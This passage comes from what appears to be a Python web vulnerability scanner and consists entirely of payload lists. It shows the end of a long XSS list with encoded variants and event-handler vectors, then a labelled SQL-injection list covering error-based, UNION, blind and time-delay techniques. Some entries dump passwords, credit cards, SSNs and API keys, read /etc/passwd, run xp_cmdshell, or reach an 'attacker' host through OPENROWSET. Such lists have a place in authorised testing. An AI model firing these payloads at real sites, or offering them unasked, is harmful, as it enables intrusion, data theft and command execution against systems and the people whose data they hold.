        '%3Cbody%20onload=alert(1)%3E',
        '%3Ciframe%20src=javascript:alert(1)%3E',
        '%3Cinput%20onfocus=alert(1)%20autofocus%3E',
        '%25253Cscript%25253Ealert(1)%25253C%25252Fscript%25253E',
        '%25253Cimg%252520src=x%252520onerror=alert(1)%25253E',
        '%25253Csvg%252520onload=alert(1)%25253E',
        '%25253Cbody%252520onload=alert(1)%25253E',
        '%25253Ciframe%252520src=javascript:alert(1)%25253E',
        '&#x0003C;&#x00073;&#x00063;&#x00072;&#x00069;&#x00070;&#x00074;&#x0003E;&#x00061;&#x0006C;&#x00065;&#x00072;&#x00074;&#x00028;&#x00031;&#x00029;&#x0003C;&#x0002F;&#x00073;&#x00063;&#x00072;&#x00069;&#x00070;&#x00074;&#x0003E;',
        '&#x0003C;&#x00069;&#x0006D;&#x00067;&#x00020;&#x00073;&#x00072;&#x00063;&#x0003D;&#x00078;&#x00020;&#x0006F;&#x0006E;&#x00065;&#x00072;&#x00072;&#x0006F;&#x00072;&#x0003D;&#x00061;&#x0006C;&#x00065;&#x00072;&#x00074;&#x00028;&#x00031;&#x00029;&#x0003E;',
        '&#x0003C;&#x00073;&#x00076;&#x00067;&#x00020;&#x0006F;&#x0006E;&#x0006C;&#x0006F;&#x00061;&#x00064;&#x0003D;&#x00061;&#x0006C;&#x00065;&#x00072;&#x00074;&#x00028;&#x00031;&#x00029;&#x0003E;',
        '&#x0003C;&#x00062;&#x0006F;&#x00064;&#x00079;&#x00020;&#x0006F;&#x0006E;&#x0006C;&#x0006F;&#x00061;&#x00064;&#x0003D;&#x00061;&#x0006C;&#x00065;&#x00072;&#x00074;&#x00028;&#x00031;&#x00029;&#x0003E;',
        '&#x0003C;&#x00069;&#x00066;&#x00072;&#x00061;&#x0006D;&#x00065;&#x00020;&#x00073;&#x00072;&#x00063;&#x0003D;&#x0006A;&#x00061;&#x00076;&#x00061;&#x00073;&#x00063;&#x00072;&#x00069;&#x00070;&#x00074;&#x0003A;&#x00061;&#x0006C;&#x00065;&#x00072;&#x00074;&#x00028;&#x00031;&#x00029;&#x0003E;',
        '%uff1c%uff53%uff43%uff52%uff49%uff50%uff54%uff1e%uff41%uff4c%uff45%uff52%uff54%uff08%uff11%uff09%uff1c%uff0f%uff53%uff43%uff52%uff49%uff50%uff54%uff1e',
        '%uff1c%uff49%uff4d%uff47%uff20%uff53%uff52%uff43%uff1d%uff58%uff20%uff4f%uff4e%uff45%uff52%uff52%uff4f%uff52%uff1d%uff41%uff4c%uff45%uff52%uff54%uff08%uff11%uff09%uff1e',
        '%uff1c%uff53%uff56%uff47%uff20%uff4f%uff4e%uff4c%uff4f%uff41%uff44%uff1d%uff41%uff4c%uff45%uff52%uff54%uff08%uff11%uff09%uff1e',
        '%uff1c%uff42%uff4f%uff44%uff59%uff20%uff4f%uff4e%uff4c%uff4f%uff41%uff44%uff1d%uff41%uff4c%uff45%uff52%uff54%uff08%uff11%uff09%uff1e',
        '%uff1c%uff49%uff46%uff52%uff41%uff4d%uff45%uff20%uff53%uff52%uff43%uff1d%uff4a%uff41%uff56%uff41%uff53%uff43%uff52%uff49%uff50%uff54%uff1a%uff41%uff4c%uff45%uff52%uff54%uff08%uff11%uff09%uff1e',
        '\\uFF1C\\uFF53\\uFF43\\uFF52\\uFF49\\uFF50\\uFF54\\uFF1E\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\uFF08\\uFF11\\uFF09\\uFF1C\\uFF0F\\uFF53\\uFF43\\uFF52\\uFF49\\uFF50\\uFF54\\uFF1E',
        '\\uFF1C\\uFF49\\uFF4D\\uFF47\\uFF20\\uFF53\\uFF52\\uFF43\\uFF1D\\uFF58\\uFF20\\uFF4F\\uFF4E\\uFF45\\uFF52\\uFF52\\uFF4F\\uFF52\\uFF1D\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\uFF08\\uFF11\\uFF09\\uFF1E',
        '\\uFF1C\\uFF53\\uFF56\\uFF47\\uFF20\\uFF4F\\uFF4E\\uFF4C\\uFF4F\\uFF41\\uFF44\\uFF1D\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\uFF08\\uFF11\\uFF09\\uFF1E',
        '\\uFF1C\\uFF42\\uFF4F\\uFF44\\uFF59\\uFF20\\uFF4F\\uFF4E\\uFF4C\\uFF4F\\uFF41\\uFF44\\uFF1D\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\uFF08\\uFF11\\uFF09\\uFF1E',
        '\\uFF1C\\uFF49\\uFF46\\uFF52\\uFF41\\uFF4D\\uFF45\\uFF20\\uFF53\\uFF52\\uFF43\\uFF1D\\uFF4A\\uFF41\\uFF56\\uFF41\\uFF53\\uFF43\\uFF52\\uFF49\\uFF50\\uFF54\\uFF1A\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\uFF08\\uFF11\\uFF09\\uFF1E',
        '&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;',
        '&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;',
        '&#x61;&#108;&#x65;&#114;&#x74;&#40;&#x31;&#41;',
        'alert(1)',
        '&#97lert(1)',
        'ale&#x72;t(1)',
        'al&#x65;rt(1)',
        'alert&#x28;1&#x29;',
        '&#97;&#108;&#x65;&#114;&#x74;&#40;1&#41;',
        '&#x61;l&#x65;rt&#x28;1&#x29;',
        
        # ==================== 981-1000: FINAL COVERAGE (20) ====================
        '<div onpointermove="alert(1)">XSS</div>',
        '<div onpointerdown="alert(1)">XSS</div>',
        '<div onpointerup="alert(1)">XSS</div>',
        '<div onpointerover="alert(1)">XSS</div>',
        '<div onpointerout="alert(1)">XSS</div>',
        '<div onpointerenter="alert(1)">XSS</div>',
        '<div onpointerleave="alert(1)">XSS</div>',
        '<div ongotpointercapture="alert(1)">XSS</div>',
        '<div onlostpointercapture="alert(1)">XSS</div>',
        '<div onwheel="alert(1)">XSS</div>',
        '<div onanimationstart="alert(1)">XSS</div>',
        '<div onanimationiteration="alert(1)">XSS</div>',
        '<div onanimationend="alert(1)">XSS</div>',
        '<div ontransitionstart="alert(1)">XSS</div>',
        '<div ontransitionrun="alert(1)">XSS</div>',
        '<div ontransitionend="alert(1)">XSS</div>',
        '<div ontransitioncancel="alert(1)">XSS</div>',
        '<div onsecuritypolicyviolation="alert(1)">XSS</div>',
        '<div onbeforeinput="alert(1)">XSS</div>',
        '<div oninput="alert(1)">XSS</div>',
    ]
    
    # ─── SQLi Payloads — 50+ vectors ──────────────────────────────────────
    SQLI_PAYLOADS = [
        # ==================== 1-50: ERROR-BASED (Original + Variasi) ====================
        ("'", "SQLi Error Single Quote"),
        ('"', "SQLi Error Double Quote"),
        ("')", "SQLi Error Single Quote Paren"),
        ('")', "SQLi Error Double Quote Paren"),
        ("''", "SQLi Error Double Single Quote"),
        ('""', "SQLi Error Double Double Quote"),
        ("`", "SQLi Error Backtick"),
        ("\\", "SQLi Error Backslash"),
        ("' OR '1'='1", "SQLi Auth Bypass Basic"),
        ("' OR '1'='1' --", "SQLi Auth Bypass Comment"),
        ("' OR 1=1--", "SQLi Numeric Bypass"),
        ('" OR "1"="1" --', "SQLi Double Quote Bypass"),
        ("' OR '1'='1' /*", "SQLi Block Comment"),
        ("admin' --", "SQLi Admin Bypass"),
        ("admin' #", "SQLi MySQL Bypass"),
        ("' OR 1=1#", "SQLi Hash Comment"),
        ("' OR 1=1-- -", "SQLi Dash Comment"),
        ("' OR 1=1--+", "SQLi Plus Comment"),
        ("' OR 1=1;--", "SQLi Semicolon Comment"),
        ("' OR '1'='1' LIMIT 1--", "SQLi Limit Bypass"),
        ("' OR 1=1 ORDER BY 1--", "SQLi Order Bypass"),
        ("' OR 1=1 GROUP BY 1--", "SQLi Group Bypass"),
        ("' OR 1=1 HAVING 1=1--", "SQLi Having Bypass"),
        ("' OR 1=1 UNION SELECT NULL--", "SQLi Union Bypass"),
        ("' AND 1=CONVERT(int, @@version)--", "SQLi Error MSSQL"),
        ("' AND extractvalue(1,concat(0x7e,version()))--", "SQLi Error MySQL Extract"),
        ("' AND updatexml(1,concat(0x7e,user(),0x7e),1)--", "SQLi Error MySQL UpdateXML"),
        ("' AND 1=(SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(version(),FLOOR(RAND()*2)))--", "SQLi Error MySQL Duplicate"),
        ("' AND 1=CAST((SELECT database()) AS int)--", "SQLi Error Cast"),
        ("' AND 1=(SELECT TOP 1 name FROM sysobjects WHERE xtype='u')--", "SQLi Error MSSQL Table"),
        ("' AND 1=convert(int, (select top 1 name from sysobjects where xtype='u'))--", "SQLi Error MSSQL Convert2"),
        ("' AND 1=CONVERT(INT, @@VERSION)--", "SQLi Error MSSQL Version"),
        ("' AND 1=(SELECT @@VERSION)--", "SQLi Error MSSQL Version2"),
        ("' AND 1=(SELECT db_name())--", "SQLi Error MSSQL DBName"),
        ("' AND 1=(SELECT user_name())--", "SQLi Error MSSQL User"),
        ("' AND 1=(SELECT @@SERVERNAME)--", "SQLi Error MSSQL Server"),
        ("' AND geometry::STGeomFromText('POINT(1 1)',0).STIsValid()=1--", "SQLi Error MSSQL Geometry"),
        ("' AND 1=fn_xe_file_target_read_file('*.xel','\\',null,null)--", "SQLi Error MSSQL XE"),
        ("' AND 1=OPENROWSET('SQLOLEDB','uid=sa;pwd=pass;Data Source=attacker','select 1')--", "SQLi Error MSSQL OpenRowset"),
        ("' AND 1=OPENDATASOURCE('SQLOLEDB','Data Source=attacker;uid=sa;pwd=pass').master.dbo.sysobjects--", "SQLi Error MSSQL OpenDatasource"),
        ("' AND 1=fn_trace_geteventinfo(1)--", "SQLi Error MSSQL Trace"),
        ("' AND 1=fn_get_audit_file('C:\\*.sqlaudit',default,default)--", "SQLi Error MSSQL Audit"),
        ("' AND 1=xp_dirtree('C:')--", "SQLi Error MSSQL DirTree"),
        ("' AND 1=xp_fileexist('C:\\windows\\win.ini')--", "SQLi Error MSSQL FileExist"),
        ("' AND 1=xp_subdirs('C:\\')--", "SQLi Error MSSQL SubDirs"),
        ("' AND 1=xp_cmdshell('dir')--", "SQLi Error MSSQL CmdShell"),
        ("' AND 1=sp_helpdb--", "SQLi Error MSSQL HelpDB"),
        ("' AND 1=sp_helptext('sp_help')--", "SQLi Error MSSQL HelpText"),
        ("' AND 1=sp_who--", "SQLi Error MSSQL Who"),
        
        # ==================== 51-150: UNION-BASED (100 payload) ====================
        ("' UNION SELECT NULL--", "SQLi Union Test 1Col"),
        ("' UNION SELECT NULL,NULL--", "SQLi Union Test 2Col"),
        ("' UNION SELECT NULL,NULL,NULL--", "SQLi Union Test 3Col"),
        ("' UNION SELECT NULL,NULL,NULL,NULL--", "SQLi Union Test 4Col"),
        ("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "SQLi Union Test 5Col"),
        ("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--", "SQLi Union Test 6Col"),
        ("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "SQLi Union Test 7Col"),
        ("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "SQLi Union Test 8Col"),
        ("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "SQLi Union Test 9Col"),
        ("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "SQLi Union Test 10Col"),
        ("' UNION SELECT 1,2,3--", "SQLi Union Positions 3"),
        ("' UNION SELECT 1,2,3,4--", "SQLi Union Positions 4"),
        ("' UNION SELECT 1,2,3,4,5--", "SQLi Union Positions 5"),
        ("' UNION SELECT 1,2,3,4,5,6--", "SQLi Union Positions 6"),
        ("' UNION SELECT 1,2,3,4,5,6,7--", "SQLi Union Positions 7"),
        ("' UNION SELECT 1,2,3,4,5,6,7,8--", "SQLi Union Positions 8"),
        ("' UNION SELECT 1,2,3,4,5,6,7,8,9--", "SQLi Union Positions 9"),
        ("' UNION SELECT 1,2,3,4,5,6,7,8,9,10--", "SQLi Union Positions 10"),
        ("' UNION SELECT @@version,NULL--", "SQLi Union Version MySQL"),
        ("' UNION SELECT @@version,NULL,NULL--", "SQLi Union Version2"),
        ("' UNION SELECT @@datadir,NULL--", "SQLi Union DataDir"),
        ("' UNION SELECT @@basedir,NULL--", "SQLi Union BaseDir"),
        ("' UNION SELECT user(),database()--", "SQLi Union UserDB"),
        ("' UNION SELECT schema_name,NULL FROM information_schema.schemata--", "SQLi Union Schemas"),
        ("' UNION SELECT table_name,NULL FROM information_schema.tables--", "SQLi Union Tables"),
        ("' UNION SELECT column_name,NULL FROM information_schema.columns--", "SQLi Union Columns"),
        ("' UNION SELECT table_name,column_name FROM information_schema.columns--", "SQLi Union TableColumn"),
        ("' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--", "SQLi Union FileRead"),
        ("' UNION SELECT LOAD_FILE('C:\\windows\\win.ini'),NULL--", "SQLi Union FileRead Win"),
        ("' UNION SELECT @@hostname,NULL--", "SQLi Union Hostname"),
        ("' UNION SELECT @@tmpdir,NULL--", "SQLi Union TempDir"),
        ("' UNION SELECT version(),NULL--", "SQLi Union PG Version"),
        ("' UNION SELECT current_database(),NULL--", "SQLi Union PG DB"),
        ("' UNION SELECT current_user,NULL--", "SQLi Union PG User"),
        ("' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--", "SQLi Union PG Tables"),
        ("' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", "SQLi Union PG Columns"),
        ("' UNION SELECT name,NULL FROM sys.tables--", "SQLi Union MSSQL Tables"),
        ("' UNION SELECT name,NULL FROM sys.columns WHERE object_id=OBJECT_ID('users')--", "SQLi Union MSSQL Columns"),
        ("' UNION SELECT DB_NAME(),NULL--", "SQLi Union MSSQL DB"),
        ("' UNION SELECT SUSER_NAME(),NULL--", "SQLi Union MSSQL User"),
        ("' UNION SELECT @@SERVERNAME,NULL--", "SQLi Union MSSQL Server"),
        ("' UNION SELECT @@SERVICENAME,NULL--", "SQLi Union MSSQL Service"),
        ("' UNION SELECT @@LANGUAGE,NULL--", "SQLi Union Language"),
        ("' UNION SELECT @@MAX_CONNECTIONS,NULL--", "SQLi Union MaxConn"),
        ("' UNION SELECT @@MAX_PRECISION,NULL--", "SQLi Union MaxPrec"),
        ("' UNION SELECT @@NESTLEVEL,NULL--", "SQLi Union NestLevel"),
        ("' UNION SELECT @@OPTIONS,NULL--", "SQLi Union Options"),
        ("' UNION SELECT @@PACKET_ERRORS,NULL--", "SQLi Union PacketErrors"),
        ("' UNION SELECT @@PACK_RECEIVED,NULL--", "SQLi Union PackReceived"),
        ("' UNION SELECT @@PACK_SENT,NULL--", "SQLi Union PackSent"),
        ("' UNION SELECT @@PROCID,NULL--", "SQLi Union ProcID"),
        ("' UNION SELECT @@REMSERVER,NULL--", "SQLi Union RemServer"),
        ("' UNION SELECT @@ROWCOUNT,NULL--", "SQLi Union RowCount"),
        ("' UNION SELECT @@TEXTSIZE,NULL--", "SQLi Union TextSize"),
        ("' UNION SELECT @@VERSION,NULL--", "SQLi Union Version"),
        ("' UNION SELECT db_name(),user_name()--", "SQLi Union DBUser"),
        ("' UNION SELECT name,password FROM users--", "SQLi Union Creds"),
        ("' UNION SELECT username,password FROM admin--", "SQLi Union AdminCreds"),
        ("' UNION SELECT id,email FROM customers--", "SQLi Union Customer"),
        ("' UNION SELECT title,content FROM posts--", "SQLi Union Posts"),
        ("' UNION SELECT product,name FROM products--", "SQLi Union Products"),
        ("' UNION SELECT card_number,expiry FROM credit_cards--", "SQLi Union CreditCards"),
        ("' UNION SELECT ssn,first_name FROM employees--", "SQLi Union SSN"),
        ("' UNION SELECT api_key,secret FROM tokens--", "SQLi Union API"),
        ("' UNION SELECT session_id,user_id FROM sessions--", "SQLi Union Sessions"),
        ("' UNION SELECT log,password_hash FROM logs--", "SQLi Union Logs"),
        ("' UNION SELECT file_name,file_content FROM files--", "SQLi Union Files"),
        ("' UNION SELECT comment,author FROM comments--", "SQLi Union Comments"),
        ("' UNION SELECT role,name FROM roles--", "SQLi Union Roles"),
        ("' UNION SELECT permission,resource FROM permissions--", "SQLi Union Permissions"),
        ("' UNION SELECT token,user_agent FROM auth_tokens--", "SQLi Union AuthTokens"),
        ("' UNION SELECT reset_code,email FROM password_resets--", "SQLi Union ResetCodes"),
        ("' UNION SELECT otp_secret,user_id FROM mfa--", "SQLi Union MFA"),
        ("' UNION SELECT backup_path,backup_date FROM backups--", "SQLi Union Backups"),
        ("' UNION SELECT config_key,config_value FROM config--", "SQLi Union Config"),
        ("' UNION SELECT audit_action,audit_user FROM audit_log--", "SQLi Union Audit"),
        ("' UNION SELECT notification,recipient FROM notifications--", "SQLi Union Notifications"),
        ("' UNION SELECT order_id,total FROM orders--", "SQLi Union Orders"),
        ("' UNION SELECT transaction_id,amount FROM transactions--", "SQLi Union Transactions"),
        ("' UNION SELECT message,sender FROM messages--", "SQLi Union Messages"),
        ("' UNION SELECT friend_id,status FROM friendships--", "SQLi Union Friendships"),
        ("' UNION SELECT post_id,likes_count FROM likes--", "SQLi Union Likes"),
        ("' UNION SELECT follower_id,following_id FROM follows--", "SQLi Union Follows"),
        ("' UNION SELECT report_name,report_data FROM reports--", "SQLi Union Reports"),
        ("' UNION SELECT job_title,salary FROM jobs--", "SQLi Union Jobs"),
        ("' UNION SELECT department,budget FROM departments--", "SQLi Union Departments"),
        ("' UNION SELECT project_name,deadline FROM projects--", "SQLi Union Projects"),
        ("' UNION SELECT task_name,assignee FROM tasks--", "SQLi Union Tasks"),
        ("' UNION SELECT invoice_number,due_date FROM invoices--", "SQLi Union Invoices"),
        ("' UNION SELECT customer_name,phone FROM customers--", "SQLi Union Customers"),
        ("' UNION SELECT supplier_name,contact FROM suppliers--", "SQLi Union Suppliers"),
        ("' UNION SELECT inventory_item,quantity FROM inventory--", "SQLi Union Inventory"),
        ("' UNION SELECT shipping_address,tracking FROM shipping--", "SQLi Union Shipping"),
        ("' UNION SELECT coupon_code,discount FROM coupons--", "SQLi Union Coupons"),
        ("' UNION SELECT review_text,rating FROM reviews--", "SQLi Union Reviews"),
        ("' UNION SELECT search_query,search_date FROM searches--", "SQLi Union Searches"),
        ("' UNION SELECT ip_address,country FROM geolocation--", "SQLi Union GeoIP"),
        ("' UNION SELECT device_id,device_type FROM devices--", "SQLi Union Devices"),
        
        # ==================== 151-250: BOOLEAN BLIND (100 payload) ====================
        ("' AND 1=1--", "SQLi Blind True Basic"),
        ("' AND 1=2--", "SQLi Blind False Basic"),
        ("' AND '1'='1' --", "SQLi Blind String True"),
        ("' AND '1'='2' --", "SQLi Blind String False"),
        ("' AND 1=1 AND 'a'='a'--", "SQLi Blind Double True"),
        ("' AND (1=1)--", "SQLi Blind Paren True"),
        ("' AND 1=1#", "SQLi Blind True Hash"),
        ("' AND 1=2#", "SQLi Blind False Hash"),
        ("' AND 1=1/*", "SQLi Blind True Comment"),
        ("' AND 1=2/*", "SQLi Blind False Comment"),
        ("' AND 1=1--+", "SQLi Blind True Plus"),
        ("' AND 1=2--+", "SQLi Blind False Plus"),
        ("' AND 1=1;--", "SQLi Blind True Semicolon"),
        ("' AND 1=2;--", "SQLi Blind False Semicolon"),
        ("' AND 2>1--", "SQLi Blind True Greater"),
        ("' AND 1>2--", "SQLi Blind False Greater"),
        ("' AND 1<2--", "SQLi Blind True Less"),
        ("' AND 2<1--", "SQLi Blind False Less"),
        ("' AND 1<=1--", "SQLi Blind True EqLess"),
        ("' AND 2<=1--", "SQLi Blind False EqLess"),
        ("' AND 1>=1--", "SQLi Blind True EqGreater"),
        ("' AND 1>=2--", "SQLi Blind False EqGreater"),
        ("' AND 1<>2--", "SQLi Blind True NotEq"),
        ("' AND 1<>1--", "SQLi Blind False NotEq"),
        ("' AND 1 BETWEEN 0 AND 2--", "SQLi Blind True Between"),
        ("' AND 1 BETWEEN 2 AND 3--", "SQLi Blind False Between"),
        ("' AND 1 IN (1,2,3)--", "SQLi Blind True IN"),
        ("' AND 1 IN (2,3,4)--", "SQLi Blind False IN"),
        ("' AND 1 LIKE '1'--", "SQLi Blind True Like"),
        ("' AND 1 LIKE '2'--", "SQLi Blind False Like"),
        ("' AND ISNULL(1,0)=1--", "SQLi Blind True IsNull"),
        ("' AND ISNULL(NULL,1)=1--", "SQLi Blind True IsNull2"),
        ("' AND COALESCE(NULL,1)=1--", "SQLi Blind True Coalesce"),
        ("' AND NULLIF(1,1) IS NULL--", "SQLi Blind True NullIf"),
        ("' AND CASE WHEN 1=1 THEN 1 ELSE 0 END=1--", "SQLi Blind True Case"),
        ("' AND CASE WHEN 1=2 THEN 1 ELSE 0 END=1--", "SQLi Blind False Case"),
        ("' AND IF(1=1,1,0)=1--", "SQLi Blind True IF"),
        ("' AND IF(1=2,1,0)=1--", "SQLi Blind False IF"),
        ("' AND IFNULL(1,0)=1--", "SQLi Blind True IFNULL"),
        ("' AND NULLIF(1,2)=1--", "SQLi Blind True NULLIF"),
        ("' AND STRCMP('a','a')=0--", "SQLi Blind True StrCmp"),
        ("' AND STRCMP('a','b')=0--", "SQLi Blind False StrCmp"),
        ("' AND ASCII('A')=65--", "SQLi Blind True ASCII"),
        ("' AND ASCII('A')=66--", "SQLi Blind False ASCII"),
        ("' AND CHAR(65)='A'--", "SQLi Blind True CHAR"),
        ("' AND CHAR(66)='A'--", "SQLi Blind False CHAR"),
        ("' AND LENGTH('test')=4--", "SQLi Blind True Length"),
        ("' AND LENGTH('test')=5--", "SQLi Blind False Length"),
        ("' AND SUBSTRING('test',1,1)='t'--", "SQLi Blind True Substring"),
        ("' AND SUBSTRING('test',1,1)='x'--", "SQLi Blind False Substring"),
        ("' AND MID('test',1,1)='t'--", "SQLi Blind True MID"),
        ("' AND LEFT('test',1)='t'--", "SQLi Blind True LEFT"),
        ("' AND RIGHT('test',1)='t'--", "SQLi Blind True RIGHT"),
        ("' AND POSITION('e' IN 'test')>0--", "SQLi Blind True Position"),
        ("' AND LOCATE('e','test')>0--", "SQLi Blind True Locate"),
        ("' AND INSTR('test','e')>0--", "SQLi Blind True Instr"),
        ("' AND REGEXP_LIKE('test','^t')--", "SQLi Blind True Regex"),
        ("' AND 'test' REGEXP '^t'--", "SQLi Blind True Regex2"),
        ("' AND 'test' RLIKE '^t'--", "SQLi Blind True RLIKE"),
        ("' AND (SELECT database()) LIKE '%'--", "SQLi Blind True DBLike"),
        ("' AND (SELECT user()) LIKE '%'--", "SQLi Blind True UserLike"),
        ("' AND (SELECT version()) LIKE '%'--", "SQLi Blind True VersionLike"),
        ("' AND EXISTS(SELECT 1 FROM users)--", "SQLi Blind True Exists"),
        ("' AND NOT EXISTS(SELECT 1 FROM nonexistent)--", "SQLi Blind True NotExists"),
        ("' AND (SELECT COUNT(*) FROM users)>0--", "SQLi Blind True Count"),
        ("' AND (SELECT COUNT(*) FROM users)=0--", "SQLi Blind False Count"),
        ("' AND (SELECT 1 UNION SELECT 2)=1--", "SQLi Blind True Union"),
        ("' AND (SELECT 1 FROM users LIMIT 1)=1--", "SQLi Blind True Limit"),
        ("' AND (SELECT username FROM users LIMIT 1)='admin'--", "SQLi Blind Extract Username"),
        ("' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>97--", "SQLi Blind Bruteforce Pass"),
        ("' AND ORD(MID((SELECT database()),1,1))>100--", "SQLi Blind Bruteforce DB"),
        ("' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u'--", "SQLi Blind Bruteforce Table"),
        ("' AND (SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns LIMIT 1)='i'--", "SQLi Blind Bruteforce Column"),
        ("' AND BIT_LENGTH('test')=32--", "SQLi Blind True BitLength"),
        ("' AND OCTET_LENGTH('test')=4--", "SQLi Blind True OctetLength"),
        ("' AND CHARACTER_LENGTH('test')=4--", "SQLi Blind True CharLength"),
        ("' AND FIND_IN_SET('a','a,b,c')>0--", "SQLi Blind True FindInSet"),
        ("' AND FIELD('a','b','c','a')=3--", "SQLi Blind True Field"),
        ("' AND ELT(2,'a','b','c')='b'--", "SQLi Blind True Elt"),
        ("' AND MAKE_SET(1,'a','b')='a'--", "SQLi Blind True MakeSet"),
        ("' AND EXP(1)>2.7--", "SQLi Blind True Exp"),
        ("' AND LN(2.71828)>0.9--", "SQLi Blind True Ln"),
        ("' AND LOG10(100)=2--", "SQLi Blind True Log10"),
        ("' AND LOG2(8)=3--", "SQLi Blind True Log2"),
        ("' AND POW(2,3)=8--", "SQLi Blind True Pow"),
        ("' AND SQRT(16)=4--", "SQLi Blind True Sqrt"),
        ("' AND ABS(-5)=5--", "SQLi Blind True Abs"),
        ("' AND CEIL(1.2)=2--", "SQLi Blind True Ceil"),
        ("' AND FLOOR(1.8)=1--", "SQLi Blind True Floor"),
        ("' AND ROUND(1.5)=2--", "SQLi Blind True Round"),
        ("' AND TRUNCATE(1.9,0)=1--", "SQLi Blind True Truncate"),
        ("' AND SIGN(5)=1--", "SQLi Blind True Sign"),
        ("' AND GREATEST(1,2,3)=3--", "SQLi Blind True Greatest"),
        ("' AND LEAST(1,2,3)=1--", "SQLi Blind True Least"),
        ("' AND CONCAT('a','b')='ab'--", "SQLi Blind True Concat"),
        ("' AND CONCAT_WS('-','a','b')='a-b'--", "SQLi Blind True ConcatWS"),
        ("' AND GROUP_CONCAT('a')='a'--", "SQLi Blind True GroupConcat"),
        ("' AND REPEAT('a',3)='aaa'--", "SQLi Blind True Repeat"),
        ("' AND REVERSE('abc')='cba'--", "SQLi Blind True Reverse"),
        ("' AND SPACE(3)='   '--", "SQLi Blind True Space"),
        ("' AND LPAD('a',3,'0')='00a'--", "SQLi Blind True LPAD"),
        ("' AND RPAD('a',3,'0')='a00'--", "SQLi Blind True RPAD"),
        ("' AND TRIM(' a ')='a'--", "SQLi Blind True Trim"),
        ("' AND LTRIM(' a')='a'--", "SQLi Blind True LTrim"),
        ("' AND RTRIM('a ')='a'--", "SQLi Blind True RTrim"),
        ("' AND SOUNDEX('test')=SOUNDEX('test')--", "SQLi Blind True Soundex"),
        ("' AND DATEDIFF('2024-01-01','2024-01-02')=-1--", "SQLi Blind True Datediff"),
        ("' AND ADDDATE('2024-01-01',1)='2024-01-02'--", "SQLi Blind True AddDate"),
        ("' AND CURDATE()=CURDATE()--", "SQLi Blind True CurDate"),
        ("' AND NOW()=NOW()--", "SQLi Blind True Now"),
        
        # ==================== 251-350: TIME-BASED (100 payload) ====================
        ("' AND SLEEP(1)--", "SQLi Time MySQL 1s"),
        ("' AND SLEEP(2)--", "SQLi Time MySQL 2s"),
        ("' AND SLEEP(3)--", "SQLi Time MySQL 3s"),
        ("' AND SLEEP(5)--", "SQLi Time MySQL 5s"),
        ("' AND SLEEP(10)--", "SQLi Time MySQL 10s"),
        ("' AND SLEEP(0.5)--", "SQLi Time MySQL 0.5s"),
        ("' AND BENCHMARK(1000000,MD5('a'))--", "SQLi Time MySQL Benchmark"),
        ("' AND BENCHMARK(5000000,MD5('a'))--", "SQLi Time MySQL Benchmark5M"),
        ("' AND BENCHMARK(10000000,MD5('a'))--", "SQLi Time MySQL Benchmark10M"),
        ("' AND BENCHMARK(50000000,MD5('a'))--", "SQLi Time MySQL Benchmark50M"),
        ("' AND pg_sleep(1)--", "SQLi Time PG 1s"),
        ("' AND pg_sleep(2)--", "SQLi Time PG 2s"),
        ("' AND pg_sleep(3)--", "SQLi Time PG 3s"),
        ("' AND pg_sleep(5)--", "SQLi Time PG 5s"),
        ("' AND pg_sleep(0.5)--", "SQLi Time PG 0.5s"),
        ("' AND (SELECT pg_sleep(3))--", "SQLi Time PG Subquery"),
        ("' WAITFOR DELAY '0:0:1'--", "SQLi Time MSSQL 1s"),
        ("' WAITFOR DELAY '0:0:2'--", "SQLi Time MSSQL 2s"),
        ("' WAITFOR DELAY '0:0:3'--", "SQLi Time MSSQL 3s"),
        ("' WAITFOR DELAY '0:0:5'--", "SQLi Time MSSQL 5s"),
        ("' WAITFOR DELAY '00:00:01'--", "SQLi Time MSSQL Format"),
        ("' WAITFOR DELAY '00:00:03'--", "SQLi Time MSSQL Format2"),
        ("' AND 1=IF(1=1,SLEEP(3),0)--", "SQLi Time Conditional True"),
        ("' AND 1=IF(1=2,SLEEP(3),0)--", "SQLi Time Conditional False"),
        ("' AND IF(1=1,SLEEP(3),0)--", "SQLi Time IF True"),
        ("' AND IF(1=2,SLEEP(3),0)--", "SQLi Time IF False"),
        ("' OR SLEEP(3)='", "SQLi Time OR Sleep"),
        ("' OR IF(1=1,SLEEP(3),0)='", "SQLi Time OR IF"),
        ("' AND CASE WHEN 1=1 THEN SLEEP(3) ELSE 0 END--", "SQLi Time CASE True"),
        ("' AND CASE WHEN 1=2 THEN SLEEP(3) ELSE 0 END--", "SQLi Time CASE False"),
        ("' AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE SLEEP(3))--", "SQLi Time Nested Sleep"),
        ("' AND RLIKE SLEEP(3)--", "SQLi Time RLIKE"),
        ("' AND (SELECT SLEEP(3) FROM dual)--", "SQLi Time Dual"),
        ("' AND (SELECT BENCHMARK(10000000,MD5('a')) FROM dual)--", "SQLi Time Benchmark Dual"),
        ("' AND (SELECT pg_sleep(3) FROM pg_class)--", "SQLi Time PG Class"),
        ("' AND (SELECT WAITFOR DELAY '0:0:3')--", "SQLi Time MSSQL Subquery"),
        ("' AND 1=1 AND SLEEP(3)--", "SQLi Time Double AND"),
        ("' AND SLEEP(3) AND 1=1--", "SQLi Time Sleep First"),
        ("' AND 1=1 AND (SELECT SLEEP(3))--", "SQLi Time Nested AND"),
        ("' UNION SELECT SLEEP(3)--", "SQLi Time Union Sleep"),
